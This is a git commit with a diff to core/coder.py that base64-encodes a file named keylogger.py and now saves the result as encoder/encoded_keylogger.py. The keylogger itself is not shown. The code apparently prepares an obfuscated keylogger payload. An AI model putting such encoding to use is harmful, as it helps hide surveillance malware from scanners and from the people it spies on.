19bfa42f13c3c4abc1b1983939b8c596d5072e0d
schorio <schorioignace@gmail.com>
2024-03-26 13:01:31 +0100

    sauvegarde des contenues encoder

--- core/coder.py
+++ core/coder.py
@@ -3,3 +3,6 @@ import base64
 # Encode
 with open("keylogger.py", "rb") as script_file:
     encoded_script = base64.b64encode(script_file.read())
+    
+with open("encoder/encoded_keylogger.py", "wb") as encoded_file:
+    encoded_file.write(encoded_script)
